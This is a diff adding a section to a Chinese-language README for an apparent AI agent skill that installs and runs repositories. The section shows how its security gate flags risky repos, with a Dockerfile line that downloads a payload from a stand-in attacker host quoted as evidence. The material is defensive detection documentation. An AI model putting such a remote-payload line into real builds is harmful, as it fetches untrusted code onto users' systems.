@@ -62,6 +62,44 @@ skill 会依次：
 5. **锁文件优先安装**；网络失败自动换镜像；绝不全局安装
 6. **启动**服务并**健康检查**（TCP + 常见健康路径，`scripts/health_check.py`），报告端口/URL + 复现命令
 
+## 示例：安全门能抓到什么
+
+如果一个仓库提交了 `.env`、有 `preinstall` 脚本、Dockerfile 用 `ADD` 拉取远程载荷、还有 git 来源的依赖：
+
+```json
+{
+  "risk_level": "high",
+  "findings": [
+    {"severity": "high", "file": "Dockerfile", "line": 2,
+     "pattern": "docker-add-remote",
+     "evidence": "ADD https://evil.example.com/payload.sh /tmp/p.sh"},
+    {"severity": "high", "file": ".env",
+     "pattern": "committed-env",
+     "detail": "密钥文件被提交到仓库——应该加入 .gitignore"},
+    {"severity": "medium", "file": "package.json",
+     "pattern": "npm-lifecycle-script",
+     "evidence": "preinstall: echo pwned"},
+    {"severity": "medium", "file": "package.json",
+     "pattern": "git-or-local-dependency",
+     "evidence": "left-pad: github:foo/left-pad"}
+  ]
+}
+```
+
+退出码 `2` → 代理立即停止并询问用户，不执行任何命令。干净仓库退出 `0`（`low`），继续安装。
+
+每次运行结束时输出可复现报告：
+
+```
+技术栈: node + npm (express, lockfile: package-lock.json)
+安全: low (0 findings)
+安装: npm ci (187 packages)
+启动: node index.js
+URL: http://127.0.0.1:3000 (health-checked: 200)
+SBOM: 187 components → sbom.json (CycloneDX 1.5)
+复现: git clone --depth 1 <url> && cd <dir> && npm ci && node index.js
+```
+
 ## 5 个阶段
 
 | 阶段 | 做什么 | 关键产物 |
